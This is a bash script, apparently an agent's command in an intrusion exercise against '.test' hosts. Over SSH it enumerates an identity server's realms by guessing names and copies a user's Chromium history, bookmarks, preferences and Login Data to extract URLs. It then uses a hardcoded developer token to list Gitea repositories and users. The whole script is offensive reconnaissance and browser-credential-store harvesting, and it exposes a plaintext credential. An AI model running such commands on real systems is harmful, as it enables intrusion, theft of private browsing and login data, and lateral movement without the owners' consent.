set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
echo "=== ID REDIRECTS ==="
for p in / /admin/ /admin /realms; do echo "-- $p"; curl -sSk -m 7 -o /dev/null -D - "https://identity.keplerops.test$p" | head -12; done
echo "=== REALM GUESSES ==="
for r in master keplerops keplerops-test keplerops.test KEPLEROPS KEPLEROPS.TEST fieldkest fieldlink fieldlink-workspace support workloads arwc k-dev default; do
 code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' "https://identity.keplerops.test/realms/$r"); echo "-- $r -> $code :: $(head -c 120 /tmp/o)"
done
echo "=== CHROMIUM HISTORY ==="
python3 - <<'PY'
import sqlite3,shutil
p='/home/rowan/.config/chromium/Default/History'
try:
    shutil.copy(p,'/tmp/h.db')
    c=sqlite3.connect('/tmp/h.db')
    for u,t in c.execute('select url,title from urls order by last_visit_time desc limit 60'):
        print(t,'|',u)
except Exception as e:
    print('ERR',e)
PY
echo "=== CHROMIUM PREFS/BOOKMARKS/LOGIN ==="
python3 - <<'PY'
import json,glob,re
for f in ['/home/rowan/.config/chromium/Default/Preferences','/home/rowan/.config/chromium/Default/Bookmarks','/home/rowan/.config/chromium/Default/Login Data']:
    try:
        d=open(f,'rb').read()
        print('##',f,len(d))
        for m in set(re.findall(rb'https?://[A-Za-z0-9._:/?=&%~+-]{4,120}',d)):
            print('  ',m.decode())
    except Exception as e: print('ERR',f,e)
PY
echo "=== GITEA REPO NAMES ==="
A="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
curl -sSk -m 10 -u "$A" "https://source.keplerops.test/api/v1/repos/search?limit=50" | python3 -c 'import sys,json; d=json.load(sys.stdin); print([r["full_name"] for r in (d.get("data") or d) ])'
curl -sSk -m 10 -u "$A" "https://source.keplerops.test/api/v1/orgs/fieldkest/repos?limit=50" | python3 -c 'import sys,json; d=json.load(sys.stdin); print([r["full_name"] for r in d])'
echo "=== GITEA USERS ==="
curl -sSk -m 10 -u "$A" "https://source.keplerops.test/api/v1/users/search?limit=30" | python3 -c 'import sys,json; d=json.load(sys.stdin); print([r["login"] for r in (d.get("data") or d)])'
RSH
echo DONE_K14_R19
